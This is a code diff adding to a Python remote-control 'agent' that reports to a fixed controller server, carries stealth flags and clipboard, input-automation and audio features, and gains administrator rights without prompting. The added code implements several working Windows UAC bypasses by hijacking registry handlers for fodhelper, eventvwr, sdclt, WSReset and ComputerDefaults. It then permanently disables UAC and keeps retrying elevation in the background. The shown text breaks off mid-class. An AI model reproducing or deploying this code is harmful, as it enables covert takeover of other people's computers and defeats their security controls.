@@ -1,3 +1,98 @@
+# ============================================================================
+# CRITICAL: EVENTLET MONKEY PATCH - MUST BE ABSOLUTELY FIRST!
+# ============================================================================
+# This MUST run before ANY other imports that use threading!
+# ============================================================================
+
+import sys
+import os
+
+# Debug flag for UAC and privilege operations
+UAC_DEBUG = True  # Set to True to see detailed UAC/privilege debugging
+
+def debug_print(msg):
+    """Print debug messages directly (bypasses all logging systems)"""
+    if UAC_DEBUG:
+        print(f"[DEBUG] {msg}", flush=True)
+
+debug_print("=" * 80)
+debug_print("PYTHON AGENT STARTUP - UAC PRIVILEGE DEBUGGER ENABLED")
+debug_print("=" * 80)
+debug_print(f"Python version: {sys.version}")
+debug_print(f"Platform: {sys.platform}")
+debug_print("=" * 80)
+
+# Step 1: Import eventlet and patch IMMEDIATELY
+debug_print("Step 1: Importing eventlet...")
+try:
+    import eventlet
+    debug_print("✅ eventlet imported successfully")
+except ImportError as e:
+    debug_print(f"❌ eventlet import FAILED: {e}")
+    debug_print("Installing eventlet: pip install eventlet")
+    sys.exit(1)
+
+debug_print("Step 2: Running eventlet.monkey_patch()...")
+try:
+    # CRITICAL: Suppress the RLock warning by redirecting stderr temporarily
+    import io as _io
+    old_stderr = sys.stderr
+    sys.stderr = _io.StringIO()  # Capture stderr
+    
+    # Patch threading BEFORE any other imports!
+    eventlet.monkey_patch(all=True, thread=True, time=True, socket=True, select=True)
+    
+    # Restore stderr
+    captured_stderr = sys.stderr.getvalue()
+    sys.stderr = old_stderr
+    
+    # Check if there was an RLock warning
+    if "RLock" in captured_stderr:
+        debug_print("⚠️ RLock warning detected (Python created locks before eventlet patch)")
+        debug_print("   This is EXPECTED and can be ignored - eventlet will patch future locks")
+    
+    debug_print("✅ eventlet.monkey_patch() SUCCESS!")
+    debug_print("   - all=True")
+    debug_print("   - thread=True (threading patched)")
+    debug_print("   - time=True")
+    debug_print("   - socket=True")
+    debug_print("   - select=True")
+    EVENTLET_PATCHED = True
+except Exception as e:
+    # Restore stderr if exception occurred
+    try:
+        sys.stderr = old_stderr
+    except:
+        pass
+    
+    debug_print(f"❌ eventlet.monkey_patch() FAILED: {e}")
+    debug_print("Trying basic monkey_patch()...")
+    try:
+        eventlet.monkey_patch()
+        debug_print("✅ Basic monkey_patch() SUCCESS!")
+        EVENTLET_PATCHED = True
+    except Exception as e2:
+        debug_print(f"❌ Basic monkey_patch() FAILED: {e2}")
+        EVENTLET_PATCHED = False
+
+debug_print("Step 3: Testing threading after monkey_patch()...")
+try:
+    import threading
+    test_lock = threading.RLock()
+    debug_print("✅ threading.RLock() created successfully (should be patched)")
+    del test_lock
+except Exception as e:
+    debug_print(f"❌ threading.RLock() test FAILED: {e}")
+
+debug_print("=" * 80)
+debug_print("EVENTLET SETUP COMPLETE - NOW IMPORTING OTHER MODULES")
+debug_print("=" * 80)
+
+# Suppress warnings AFTER eventlet patch
+import warnings
+warnings.filterwarnings('ignore', message='.*RLock.*')
+warnings.filterwarnings('ignore', message='Unverified HTTPS request')
+
 #CREATED BY SPHINX
 """
 Advanced Python Agent with UACME-Inspired UAC Bypass Techniques
@@ -80,8 +175,9 @@ PRIVILEGE ESCALATION METHODS (BYPASS CREDENTIAL PROMPT):
 """
 
 # Configuration flags
-SILENT_MODE = True  # Enable stealth operation (no console output)
+SILENT_MODE = False  # DISABLED for debugging - enable stealth operation (no console output)
 DEBUG_MODE = True  # Enable debug logging for troubleshooting
+UAC_PRIVILEGE_DEBUG = True  # Enable detailed UAC and privilege debugging
 DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated attempts
 RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
 
@@ -89,21 +185,8 @@ RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
 USE_FIXED_SERVER_URL = True
 FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com')
 
-# Fix eventlet issue by patching BEFORE any other imports
-try:
-    import eventlet
-    # More comprehensive monkey patching to fix RLock issues
-    eventlet.monkey_patch(all=True, thread=True, time=True)
-    
-    # Additional fix for RLock greening issues in newer Python versions
-    import threading
-    if hasattr(threading, '_RLock'):
-        threading._RLock = eventlet.green.threading.RLock
-    if hasattr(threading, 'RLock'):
-        threading.RLock = eventlet.green.threading.RLock
-        
-except ImportError:
-    pass  # eventlet not available, continue without it
+# Eventlet is now patched at the very top of the file (line 1-2)
+# This section is kept for compatibility but monkey_patch is already done
 
 # Stealth enhancer integration (gated)
 try:
@@ -178,32 +261,90 @@ def safe_import(module_name, feature_description=""):
         handle_missing_dependency(module_name, feature_description)
         return False
 
-# eventlet already imported and patched at the top of the file
+# ============================================================================
+# CRITICAL: Import standard library AFTER eventlet.monkey_patch()
+# ============================================================================
+# eventlet is already imported and patched at the top of the file
+# Now we can safely import everything else
+# ============================================================================
 
-# Standard library imports
+debug_print("[IMPORTS] Starting standard library imports...")
+
+# DEBUG: Check Python path
+debug_print(f"[IMPORTS] Python executable: {sys.executable}")
+debug_print(f"[IMPORTS] Python version: {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
+debug_print(f"[IMPORTS] sys.path has {len(sys.path)} entries")
+
+# Standard library imports (AFTER eventlet patch!)
 import time
-import urllib3
+debug_print("[IMPORTS] ✅ time imported")
+
 import warnings
+debug_print("[IMPORTS] ✅ warnings imported")
+
 import uuid
-import os
+debug_print("[IMPORTS] ✅ uuid imported")
+
 import subprocess
+debug_print("[IMPORTS] ✅ subprocess imported")
+
 import threading
-import sys
+debug_print("[IMPORTS] ✅ threading imported")
+
 import random
+debug_print("[IMPORTS] ✅ random imported")
+
 import base64
+debug_print("[IMPORTS] ✅ base64 imported")
+
 import tempfile
+debug_print("[IMPORTS] ✅ tempfile imported")
+
 import io
+debug_print("[IMPORTS] ✅ io imported")
+
 import wave
+debug_print("[IMPORTS] ✅ wave imported")
+
 import socket
+debug_print("[IMPORTS] ✅ socket imported")
+
 import json
+debug_print("[IMPORTS] ✅ json imported")
+
 import asyncio
+debug_print("[IMPORTS] ✅ asyncio imported")
+
 import platform
-from collections import defaultdict
+debug_print("[IMPORTS] ✅ platform imported")
+
 import queue
+debug_print("[IMPORTS] ✅ queue imported")
+
 import math
+debug_print("[IMPORTS] ✅ math imported")
+
 import smtplib
+debug_print("[IMPORTS] ✅ smtplib imported")
+
 from email.mime.text import MIMEText
+debug_print("[IMPORTS] ✅ email.mime.text imported")
+
 import hashlib
+debug_print("[IMPORTS] ✅ hashlib imported")
+
+# collections.defaultdict AFTER eventlet patch
+from collections import defaultdict
+debug_print("[IMPORTS] ✅ collections.defaultdict imported")
+
+# urllib3 AFTER eventlet patch (this was causing http.client issue)
+try:
+    import urllib3
+    debug_print("[IMPORTS] ✅ urllib3 imported")
+    URLLIB3_AVAILABLE = True
+except ImportError as e:
+    debug_print(f"[IMPORTS] ⚠️ urllib3 import failed: {e}")
+    URLLIB3_AVAILABLE = False
 
 # HTTP requests (used as fallback)
 try:
@@ -214,8 +355,15 @@ except ImportError:
     log_message("requests library not available, HTTP fallback disabled", "warning")
 
 # Suppress SSL warnings
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+if URLLIB3_AVAILABLE:
+    try:
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        debug_print("[IMPORTS] ✅ urllib3 warnings disabled")
+    except Exception as e:
+        debug_print(f"[IMPORTS] ⚠️ urllib3.disable_warnings failed: {e}")
+
 warnings.filterwarnings('ignore', message='Unverified HTTPS request')
+debug_print("[IMPORTS] ✅ SSL warnings suppressed")
 
 # Third-party imports with error handling
 try:
@@ -241,18 +389,56 @@ except ImportError:
 
 # Windows-specific imports
 try:
-    import win32api
-    import win32con
-    import win32clipboard
-    import win32security
-    import win32process
-    import win32event
-    import ctypes
-    from ctypes import wintypes
-    import winreg
-    WINDOWS_AVAILABLE = True
-except ImportError:
+    debug_print("[IMPORTS] Checking Windows availability...")
+    
+    # Check if we're on Windows first
+    if platform.system() != 'Windows':
+        debug_print("[IMPORTS] ❌ Not Windows platform")
+        WINDOWS_AVAILABLE = False
+        PYWIN32_AVAILABLE = False
+    else:
+        debug_print("[IMPORTS] ✅ Windows platform detected")
+        
+        # Import basic Windows modules first (always available on Windows)
+        import ctypes
+        debug_print("[IMPORTS] ✅ ctypes imported")
+        
+        from ctypes import wintypes
+        debug_print("[IMPORTS] ✅ wintypes imported")
+        
+        import winreg
+        debug_print("[IMPORTS] ✅ winreg imported")
+        
+        # Try to import pywin32 modules (may not be installed)
+        try:
+            import win32api
+            debug_print("[IMPORTS] ✅ win32api imported")
+            import win32con
+            debug_print("[IMPORTS] ✅ win32con imported")
+            import win32clipboard
+            debug_print("[IMPORTS] ✅ win32clipboard imported")
+            import win32security
+            debug_print("[IMPORTS] ✅ win32security imported")
+            import win32process
+            debug_print("[IMPORTS] ✅ win32process imported")
+            import win32event
+            debug_print("[IMPORTS] ✅ win32event imported")
+            PYWIN32_AVAILABLE = True
+            debug_print("[IMPORTS] ✅ pywin32 FULLY available")
+        except ImportError as e:
+            PYWIN32_AVAILABLE = False
+            debug_print(f"[IMPORTS] ⚠️ pywin32 not available: {e}")
+            debug_print("[IMPORTS] To install: pip install pywin32")
+        
+        WINDOWS_AVAILABLE = True
+        debug_print("[IMPORTS] ✅ WINDOWS_AVAILABLE = True")
+        
+except Exception as e:
+    debug_print(f"[IMPORTS] ❌ Windows import failed: {e}")
+    import traceback
+    traceback.print_exc()
     WINDOWS_AVAILABLE = False
+    PYWIN32_AVAILABLE = False
     
 # Audio processing imports
 try:
@@ -325,12 +511,73 @@ except ImportError:
     PYAUTOGUI_AVAILABLE = False
     log_message("pyautogui not available, GUI automation may not work", "warning")
 
-# Socket.IO imports
+# Socket.IO imports - CRITICAL FIX FOR PYTHON 3.13
 try:
-    import socketio
-    SOCKETIO_AVAILABLE = True
-except ImportError:
+    debug_print("[IMPORTS] Importing socketio (critical for controller connection)...")
+    
+    # Test if socketio package exists
+    debug_print("[IMPORTS] Testing package installation...")
+    test_result = subprocess.run(
+        [sys.executable, "-m", "pip", "show", "python-socketio"],
+        capture_output=True,
+        text=True
+    )
+    
+    if test_result.returncode == 0:
+        debug_print("[IMPORTS] ✅ python-socketio package IS installed")
+        # Show version
+        for line in test_result.stdout.split('\n'):
+            if line.startswith('Version:'):
+                debug_print(f"[IMPORTS]    {line.strip()}")
+                break
+    else:
+        debug_print("[IMPORTS] ❌ python-socketio package NOT found!")
+        debug_print("[IMPORTS] Installing now...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "python-socketio"])
+    
+    # Now try to import
+    debug_print("[IMPORTS] Attempting import...")
+    
+    # Method 1: Standard import
+    try:
+        import socketio
+        SOCKETIO_AVAILABLE = True
+        debug_print("[IMPORTS] ✅ socketio imported successfully!")
+    except ImportError as e1:
+        debug_print(f"[IMPORTS] ❌ Standard import failed: {e1}")
+        
+        # Method 2: Import from client
+        try:
+            debug_print("[IMPORTS] Trying socketio.Client...")
+            import socketio.client
+            socketio = socketio.client.Client
+            SOCKETIO_AVAILABLE = True
+            debug_print("[IMPORTS] ✅ socketio.Client imported!")
+        except ImportError as e2:
+            debug_print(f"[IMPORTS] ❌ socketio.Client import failed: {e2}")
+            
+            # Method 3: Check if it's an eventlet patching issue
+            debug_print("[IMPORTS] Checking for eventlet conflict...")
+            try:
+                # Try importing before eventlet patches it
+                import importlib
+                socketio_module = importlib.import_module('socketio')
+                socketio = socketio_module
+                SOCKETIO_AVAILABLE = True
+                debug_print("[IMPORTS] ✅ socketio imported via importlib!")
+            except Exception as e3:
+                SOCKETIO_AVAILABLE = False
+                debug_print(f"[IMPORTS] ❌ All import methods failed!")
+                debug_print(f"[IMPORTS]    Error 1: {e1}")
+                debug_print(f"[IMPORTS]    Error 2: {e2}")
+                debug_print(f"[IMPORTS]    Error 3: {e3}")
+                log_message("python-socketio not available, real-time communication may not work", "warning")
+            
+except Exception as e:
     SOCKETIO_AVAILABLE = False
+    debug_print(f"[IMPORTS] ❌ Unexpected error with socketio: {e}")
+    import traceback
+    traceback.print_exc()
     log_message("python-socketio not available, real-time communication may not work", "warning")
 
 # WebRTC imports for low-latency streaming
@@ -464,6 +711,9 @@ controller_thread = None
 connected_agents = {}
 agents_data = {}
 operators = set()
+
+# File manager state
+LAST_BROWSED_DIRECTORY = None  # Track the last directory browsed in UI file manager
 background_initializer = None
 high_performance_capture = None
 low_latency_input = None
@@ -829,21 +1079,89 @@ class BackgroundInitializer:
             self.initialization_complete.set()  # Ensure completion event is set even on error
     
     def _init_privilege_escalation(self):
-        """Initialize privilege escalation in background."""
+        """Initialize privilege escalation in background - AGGRESSIVE MODE."""
         try:
+            debug_print("=" * 80)
+            debug_print("[PRIVILEGE ESCALATION] Starting privilege escalation...")
+            debug_print("=" * 80)
+            
             if WINDOWS_AVAILABLE:
+                debug_print("[PRIVILEGE ESCALATION] Windows detected - checking admin status...")
+                
                 if not is_admin():
-                    log_message("Attempting privilege escalation in background...")
-                    if run_as_admin():
-                        return "elevation_initiated"
+                    debug_print("=" * 80)
+                    debug_print("❌ [PRIVILEGE ESCALATION] NOT ADMIN - NEED ELEVATION")
+                    debug_print("=" * 80)
+                    log_message("🔒 Not running as admin - attempting automatic elevation...")
+                    
+                    # STEP 1: Try all UAC bypass methods (SILENT - no prompts!)
+                    debug_print("[PRIVILEGE ESCALATION] STEP 1: UAC bypass methods")
+                    log_message("📋 Attempting UAC bypass methods...")
+                    
+                    debug_print("[UAC] Calling attempt_uac_bypass()...")
+                    uac_result = attempt_uac_bypass()
+                    
+                    if uac_result:
+                        debug_print("=" * 80)
+                        debug_print("✅ [UAC BYPASS] SUCCESS! Admin privileges gained!")
+                        debug_print("=" * 80)
+                        log_message("✅ UAC bypass successful! Now running with admin privileges!")
+                        
+                        # After successful bypass, disable UAC permanently
+                        debug_print("[UAC] Disabling UAC permanently...")
+                        if disable_uac():
+                            debug_print("✅ [UAC] UAC disabled successfully!")
+                            log_message("✅ UAC permanently disabled!")
+                        else:
+                            debug_print("❌ [UAC] UAC disable FAILED!")
+                        return "uac_bypass_success"
+                    else:
+                        debug_print("=" * 80)
+                        debug_print("❌ [UAC BYPASS] FAILED - All methods failed")
+                        debug_print("=" * 80)
+                    
+                    # STEP 2: If UAC bypass fails, try registry-based auto-elevation
+                    debug_print("[PRIVILEGE ESCALATION] STEP 2: Registry auto-elevation")
+                    log_message("⚠️ UAC bypass methods failed, trying registry auto-elevation...")
+                    if elevate_via_registry_auto_approve():
+                        debug_print("✅ [REGISTRY] Auto-elevation successful!")
+                        log_message("✅ Registry auto-elevation successful!")
+                        return "registry_elevation_success"
+                    else:
+                        debug_print("❌ [REGISTRY] Auto-elevation FAILED!")
+                    
+                    # STEP 3: If all else fails, continue without admin but keep trying in background
+                    debug_print("[PRIVILEGE ESCALATION] STEP 3: Background retry thread")
+                    log_message("⚠️ All elevation methods failed, will retry in background...")
+                    # Start a background thread to keep retrying UAC bypass
+                    threading.Thread(target=keep_trying_elevation, daemon=True).start()
+                    debug_print("⚠️ [PRIVILEGE ESCALATION] Continuing WITHOUT admin (background retry active)")
+                    return "elevation_pending"
                 
                 if is_admin():
+                    debug_print("=" * 80)
+                    debug_print("✅ [PRIVILEGE ESCALATION] ALREADY ADMIN!")
+                    debug_print("=" * 80)
+                    log_message("✅ Already running as admin!")
+                    
+                    # Immediately disable UAC to prevent future prompts
+                    debug_print("[UAC] Disabling UAC permanently...")
+                    log_message("🔧 Disabling UAC permanently...")
                     if disable_uac():
+                        debug_print("✅ [UAC] UAC disabled successfully!")
+                        log_message("✅ UAC permanently disabled - no more prompts!")
                         return "uac_disabled"
                     else:
+                        debug_print("❌ [UAC] UAC disable FAILED (needs HKLM write access)")
+                        log_message("⚠️ UAC disable failed (needs HKLM write access)")
                         return "uac_disable_failed"
+            
+            debug_print("[PRIVILEGE ESCALATION] Not Windows - no elevation needed")
             return "no_elevation_needed"
         except Exception as e:
+            debug_print(f"❌ [PRIVILEGE ESCALATION] EXCEPTION: {e}")
+            import traceback
+            traceback.print_exc()
             return f"privilege_escalation_error: {e}"
     
     def _init_stealth_features(self):
@@ -920,8 +1238,15 @@ class BackgroundInitializer:
             log_message(f"Error waiting for initialization completion: {e}", "error")
             return False
 
-# Global background initializer
-background_initializer = BackgroundInitializer()
+# Global background initializer (lazy-initialized to avoid RLock before eventlet patch)
+background_initializer = None
+
+def get_background_initializer():
+    """Get or create the background initializer instance (lazy initialization)"""
+    global background_initializer
+    if background_initializer is None:
+        background_initializer = BackgroundInitializer()
+    return background_initializer
 
 # --- Input Controllers ---
 mouse_controller = None
@@ -934,65 +1259,774 @@ LOW_LATENCY_INPUT_HANDLER = None  # Keep both for compatibility
 
 # --- Privilege Escalation Functions ---
 
+# ADVANCED UAC BYPASS CLASSES (from client-chop-version)
+class UACBypassError(Exception):
+    """Custom exception for UAC bypass errors"""
+    pass
+
+class UACBypassMethod:
+    """Base class for UAC bypass methods with enhanced error handling"""
+    
+    def __init__(self, name: str, description: str, method_id: int):
+        self.name = name
+        self.description = description
+        self.method_id = method_id
+        self._lock = threading.Lock()
+    
+    def execute(self) -> bool:
+        """Execute the UAC bypass method with enhanced error handling"""
+        debug_print(f"  [METHOD] Checking if {self.name} is available...")
+        
+        if not self.is_available():
+            debug_print(f"  ❌ [METHOD] {self.name} NOT AVAILABLE on this system")
+            raise UACBypassError(f"{self.name} not available on this system")
+        
+        debug_print(f"  ✅ [METHOD] {self.name} is AVAILABLE")
+        
+        with self._lock:
+            try:
+                debug_print(f"  [METHOD] Executing {self.name} (ID: {self.method_id})...")
+                log_message(f"[UAC BYPASS] Attempting method: {self.name} (ID: {self.method_id})", "info")
+                
+                result = self._execute_bypass()
+                
+                if result:
+                    debug_print(f"  ✅✅✅ [METHOD] {self.name} SUCCESS!")
+                    log_message(f"✅ [UAC BYPASS] SUCCESS! Method {self.name} worked!", "success")
+                else:
+                    debug_print(f"  ❌ [METHOD] {self.name} returned False")
+                    log_message(f"[UAC BYPASS] Method {self.name} returned False", "warning")
+                
+                return result
+                
+            except Exception as e:
+                debug_print(f"  ❌ [METHOD] {self.name} EXCEPTION: {e}")
+                log_message(f"[UAC BYPASS] Method {self.name} failed: {e}", "error")
+                raise UACBypassError(f"{self.name} failed: {e}")
+    
+    def _execute_bypass(self) -> bool:
+        """Override this method in subclasses"""
+        raise NotImplementedError("Subclasses must implement _execute_bypass")
+    
+    def is_available(self) -> bool:
+        """Check if this method is available on the current system"""
+        return WINDOWS_AVAILABLE
+    
+    def get_current_executable(self) -> str:
+        """Get the current executable path for elevation"""
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            return f'python.exe "{current_exe}"'
+        return current_exe
+    
+    def cleanup_registry(self, key_path: str, hive=None) -> None:
+        """Clean up registry entries with proper error handling"""
+        try:
+            import winreg
+            if hive is None:
+                hive = winreg.HKEY_CURRENT_USER
+            
+            winreg.DeleteKey(hive, key_path)
+            log_message(f"[CLEANUP] Registry key cleaned: {key_path}", "debug")
+        except Exception as e:
+            log_message(f"[CLEANUP] Registry cleanup failed for {key_path}: {e}", "debug")
+
+class UACBypassManager:
+    """ADVANCED UAC bypass manager with professional architecture"""
+    
+    def __init__(self):
+        debug_print("[UAC MANAGER] Creating UACBypassManager instance...")
+        debug_print("[UAC MANAGER] Creating RLock (should be patched by eventlet)...")
+        self._lock = threading.RLock()
+        debug_print("✅ [UAC MANAGER] RLock created successfully")
+        
+        self.methods = {}
+        debug_print("[UAC MANAGER] Calling _initialize_methods()...")
+        self._initialize_methods()
+        debug_print("✅ [UAC MANAGER] UACBypassManager fully initialized")
+    
+    def _initialize_methods(self):
+        """Initialize all UAC bypass methods"""
+        debug_print("[UAC MANAGER] Registering bypass methods...")
+        
+        # Register all bypass methods
+        method_list = [
+            ('fodhelper', FodhelperProtocolBypass()),
+            ('computerdefaults', ComputerDefaultsBypass()),
+            ('eventvwr', EventViewerBypass()),
+            ('sdclt', SdcltBypass()),
+            ('wsreset', WSResetBypass()),
+            ('slui', SluiBypass()),
+            ('winsat', WinsatBypass()),
+            ('silentcleanup', SilentCleanupBypass()),
+            ('icmluautil', ICMLuaUtilBypass()),
+        ]
+        
+        for name, method in method_list:
+            debug_print(f"  Registering method: {name}")
+            self.methods[name] = method
+        
+        debug_print(f"✅ [UAC MANAGER] Registered {len(self.methods)} UAC bypass methods")
+        log_message(f"[UAC MANAGER] Initialized {len(self.methods)} UAC bypass methods", "info")
+    
+    def get_available_methods(self) -> list:
+        """Get list of available UAC bypass methods"""
+        with self._lock:
+            available = [name for name, method in self.methods.items() if method.is_available()]
+            log_message(f"[UAC MANAGER] {len(available)}/{len(self.methods)} methods available", "info")
+            return available
+    
+    def execute_method(self, method_name: str) -> bool:
+        """Execute a specific UAC bypass method"""
+        with self._lock:
+            if method_name not in self.methods:
+                log_message(f"[UAC MANAGER] Unknown method: {method_name}", "error")
+                return False
+            
+            method = self.methods[method_name]
+            
+            if not method.is_available():
+                log_message(f"[UAC MANAGER] Method '{method_name}' not available", "warning")
+                return False
+            
+            try:
+                log_message(f"[UAC MANAGER] Executing method: {method.name}", "info")
+                result = method.execute()
+                
+                if result:
+                    log_message(f"✅ [UAC MANAGER] Method '{method_name}' succeeded!", "success")
+                else:
+                    log_message(f"[UAC MANAGER] Method '{method_name}' failed", "warning")
+                
+                return result
+                
+            except UACBypassError as e:
+                log_message(f"[UAC MANAGER] Method '{method_name}' error: {e}", "error")
+                return False
+            except Exception as e:
+                log_message(f"[UAC MANAGER] Unexpected error in '{method_name}': {e}", "error")
+                return False
+    
+    def try_all_methods(self) -> bool:
+        """Try all available UAC bypass methods until one succeeds"""
+        with self._lock:
+            available_methods = self.get_available_methods()
+            
+            if not available_methods:
+                debug_print("❌ [UAC MANAGER] No UAC bypass methods available")
+                log_message("[UAC MANAGER] No UAC bypass methods available", "warning")
+                return False
+            
+            debug_print(f"[UAC MANAGER] Trying {len(available_methods)} UAC bypass methods...")
+            log_message(f"[UAC MANAGER] Trying {len(available_methods)} UAC bypass methods...", "info")
+            
+            for i, method_name in enumerate(available_methods, 1):
+                try:
+                    debug_print("=" * 80)
+                    debug_print(f"[UAC MANAGER] Attempt {i}/{len(available_methods)}: {method_name}")
+                    debug_print("=" * 80)
+                    log_message(f"[UAC MANAGER] Attempt {i}/{len(available_methods)}: {method_name}", "info")
+                    
+                    result = self.execute_method(method_name)
+                    
+                    if result:
+                        debug_print("=" * 80)
+                        debug_print(f"✅ [UAC MANAGER] SUCCESS! Method '{method_name}' worked!")
+                        debug_print("=" * 80)
+                        log_message(f"✅ [UAC MANAGER] UAC bypass successful with method: {method_name}!", "success")
+                        return True
+                    else:
+                        debug_print(f"❌ [UAC MANAGER] Method '{method_name}' FAILED")
+                        
+                except Exception as e:
+                    debug_print(f"❌ [UAC MANAGER] EXCEPTION in method '{method_name}': {e}")
+                    log_message(f"[UAC MANAGER] Error trying method '{method_name}': {e}", "error")
+                    continue
+            
+            debug_print("=" * 80)
+            debug_print("❌ [UAC MANAGER] ALL METHODS FAILED!")
+            debug_print("=" * 80)
+            log_message("[UAC MANAGER] ❌ All UAC bypass methods failed", "error")
+            return False
+    
+    def run_as_admin(self) -> bool:
+        """Attempt to run the current process as administrator"""
+        if is_admin():
+            log_message("[UAC MANAGER] Already running as administrator", "info")
+            return True
+        
+        log_message("[UAC MANAGER] Attempting to escalate privileges...", "info")
+        return self.try_all_methods()
+
+# ADVANCED UAC BYPASS METHOD CLASSES
+
+class FodhelperProtocolBypass(UACBypassMethod):
+    """Enhanced UAC bypass using fodhelper.exe and ms-settings protocol (UACME Method 33)"""
+    
+    def __init__(self):
+        super().__init__(
+            "Fodhelper Protocol",
+            "UAC bypass using fodhelper.exe and ms-settings protocol",
+            33
+        )
+    
+    def is_available(self) -> bool:
+        return super().is_available() and os.path.exists(r"C:\Windows\System32\fodhelper.exe")
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
+            
+            # Create protocol handler
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            # Execute fodhelper
+            process = subprocess.Popen(
+                [r"C:\Windows\System32\fodhelper.exe"],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            try:
+                process.communicate(timeout=10)
+            except subprocess.TimeoutExpired:
+                process.kill()
+            
+            time.sleep(2)
+            self.cleanup_registry(key_path)
+            return True
+            
+        except Exception as e:
+            try:
+                self.cleanup_registry(key_path)
+            except:
+                pass
+            raise UACBypassError(f"Fodhelper protocol bypass failed: {e}")
+
+class ComputerDefaultsBypass(UACBypassMethod):
+    """Enhanced UAC bypass using computerdefaults.exe"""
+    
+    def __init__(self):
+        super().__init__(
+            "Computer Defaults",
+            "UAC bypass using computerdefaults.exe",
+            33
+        )
+    
+    def is_available(self) -> bool:
+        return super().is_available() and os.path.exists(r"C:\Windows\System32\ComputerDefaults.exe")
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
+            
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            process = subprocess.Popen(
+                [r"C:\Windows\System32\ComputerDefaults.exe"],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            try:
+                process.communicate(timeout=10)
+            except subprocess.TimeoutExpired:
+                process.kill()
+            
+            time.sleep(2)
+            self.cleanup_registry(key_path)
+            return True
+            
+        except Exception as e:
+            try:
+                self.cleanup_registry(key_path)
+            except:
+                pass
+            raise UACBypassError(f"Computer defaults bypass failed: {e}")
+
+class EventViewerBypass(UACBypassMethod):
+    """Enhanced UAC bypass using EventVwr.exe (UACME Method 25)"""
+    
+    def __init__(self):
+        super().__init__(
+            "Event Viewer",
+            "UAC bypass using EventVwr.exe registry hijacking",
+            25
+        )
+    
+    def is_available(self) -> bool:
+        return super().is_available() and os.path.exists(r"C:\Windows\System32\eventvwr.exe")
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Software\Classes\mscfile\shell\open\command"
+            
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.CloseKey(key)
+            
+            process = subprocess.Popen(
+                [r"C:\Windows\System32\eventvwr.exe"],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            try:
+                process.communicate(timeout=15)
+            except subprocess.TimeoutExpired:
+                process.kill()
+            
+            time.sleep(3)
+            self.cleanup_registry(key_path)
+            return True
+            
+        except Exception as e:
+            try:
+                self.cleanup_registry(key_path)
+            except:
+                pass
+            raise UACBypassError(f"Event Viewer bypass failed: {e}")
+
+class SdcltBypass(UACBypassMethod):
+    """Enhanced UAC bypass using sdclt.exe (UACME Method 31)"""
+    
+    def __init__(self):
+        super().__init__(
+            "Sdclt",
+            "UAC bypass using sdclt.exe",
+            31
+        )
+    
+    def is_available(self) -> bool:
+        return super().is_available() and os.path.exists(r"C:\Windows\System32\sdclt.exe")
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Software\Classes\Folder\shell\open\command"
+            
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            process = subprocess.Popen(
+                [r"C:\Windows\System32\sdclt.exe"],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            try:
+                process.communicate(timeout=15)
+            except subprocess.TimeoutExpired:
+                process.kill()
+            
+            time.sleep(3)
+            self.cleanup_registry(key_path)
+            return True
+            
+        except Exception as e:
+            try:
+                self.cleanup_registry(key_path)
+            except:
+                pass
+            raise UACBypassError(f"Sdclt bypass failed: {e}")
+
+class WSResetBypass(UACBypassMethod):
+    """Enhanced UAC bypass using WSReset.exe (UACME Method 56)"""
+    
+    def __init__(self):
+        super().__init__(
+            "WSReset",
+            "UAC bypass using WSReset.exe",
+            56
+        )
+    
+    def is_available(self) -> bool:
+        return super().is_available() and os.path.exists(r"C:\Windows\System32\WSReset.exe")
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command"
+            
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            process = subprocess.Popen(
+                [r"C:\Windows\System32\WSReset.exe"],
